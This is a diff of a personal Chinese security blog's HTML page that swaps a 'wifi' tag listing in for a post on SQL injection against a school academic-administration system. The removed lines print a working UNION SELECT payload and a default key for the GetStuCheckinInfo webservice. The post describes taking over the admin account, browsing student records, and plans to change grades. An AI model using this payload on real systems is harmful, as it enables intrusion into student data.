@@ -6,42 +6,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://y00z.github.io">
-  <title>某教务系统注入getshell提权一条龙(上) | Yooz的博客</title>
+  <title>Tag: wifi | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，">
-<meta property="og:type" content="article">
-<meta property="og:title" content="某教务系统注入getshell提权一条龙(上)">
-<meta property="og:url" content="http://y00z.github.io/2017/03/14/diary-2017-0314-01/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Yooz的博客">
+<meta property="og:url" content="http://y00z.github.io/tags/wifi/index.html">
 <meta property="og:site_name" content="Yooz的博客">
-<meta property="og:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-45.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-46.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-47.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-48.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-49.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-50.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-51.png">
-<meta property="og:image" content="http://y00z.github.io/images/pasted-52.png">
-<meta property="og:updated_time" content="2017-05-22T16:25:40.689Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="某教务系统注入getshell提权一条龙(上)">
-<meta name="twitter:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，">
-<meta name="twitter:image" content="http://y00z.github.io/images/pasted-45.png">
+<meta name="twitter:title" content="Yooz的博客">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
@@ -181,119 +153,36 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-diary-2017-0314-01" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      某教务系统注入getshell提权一条龙(上)
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2018" class="archive-year">2018</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2018/06/09/ESP8266/" class="archive-article-date">
+  	<time datetime="2018-06-09T10:21:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-09</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2018/06/09/ESP8266/">ESP8266</a>
     </h1>
   
 
-        
-        <a href="/2017/03/14/diary-2017-0314-01/" class="archive-article-date">
-  	<time datetime="2017-03-14T03:14:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
-<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
-
-</blockquote>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，<a id="more"></a>土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。</p>
-</blockquote>
-<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><blockquote>
-<p>今天的目标</p>
-</blockquote>
-<p><img src="/images/pasted-45.png" alt=""></p>
-<blockquote>
-<p>找到webservice接口，路径在service.asmx</p>
-</blockquote>
-<p><img src="/images/pasted-46.png" alt=""></p>
-<blockquote>
-<p>漏洞在于</p>
-<ul>
-<li>GetStuCheckinInfo<br>这个接口</li>
-</ul>
-</blockquote>
-<p><img src="/images/pasted-47.png" alt=""></p>
-<blockquote>
-<p>我们只需要关注<code>xh</code>和 <code>strKey</code> 这两个节点就可以了。</p>
-<p>其中的strKey都是默认的<code>KKKGZ2312</code></p>
-<p><code>Xh</code>这个节点就是我们的注入语句了。</p>
-</blockquote>
-<p>poc:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">222222' union <span class="keyword">select</span> </div><div class="line"><span class="literal">Null</span>,kl,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span></div><div class="line">,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span>,<span class="literal">Null</span> <span class="keyword">from</span> yhb <span class="keyword">where</span> yhm=<span class="string">'jwc01</span></div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>yhb   用户表<br>yhm   用户名<br>kl    口令</p>
-<p>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)</p>
-<p>构造好语句开始注入</p>
-</blockquote>
-<p><img src="/images/pasted-48.png" alt=""></p>
-<blockquote>
-<p>可以看到jwc01用户的密码密文出来了。</p>
-<p>我们拿去解密</p>
-</blockquote>
-<p><img src="/images/pasted-49.png" alt=""></p>
-<blockquote>
-<p>Ok可以登录了</p>
-</blockquote>
-<p><img src="/images/pasted-50.png" alt=""></p>
-<blockquote>
-<p>Bingo</p>
-</blockquote>
-<p><img src="/images/pasted-51.png" alt=""></p>
-<blockquote>
-<p>靓女多多，</p>
-</blockquote>
-<p><img src="/images/pasted-52.png" alt=""></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
-<p>不想让文章太长，getshell提权部分就放在下篇。<br>后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>
-</blockquote>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/zhifubao1.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/weixin1.jpg">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -301,126 +190,27 @@ var _hmt = _hmt || [];
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全攻防</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">wifi</a>
+        		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2017/03/14/diary-2017-0314-01/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2017/03/14/diary-2017-0314-02/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          某教务系统注入getshell提权一条龙(下)
-        
-      </div>
-    </a>
   
   
-    <a href="/2017/03/07/diary-2017-0307-01/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">s2-045任意命令执行exp</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-  <div id="SOHUCS" sid="diary-2017-0314-01" ></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = "cysYxW0PK"; 
-var conf = "prod_5b98c68db8482587445927187301a1b0"; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("//changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
-  
-
-  
+    
 
 
           </div>
@@ -443,9 +233,9 @@ window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="tex
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
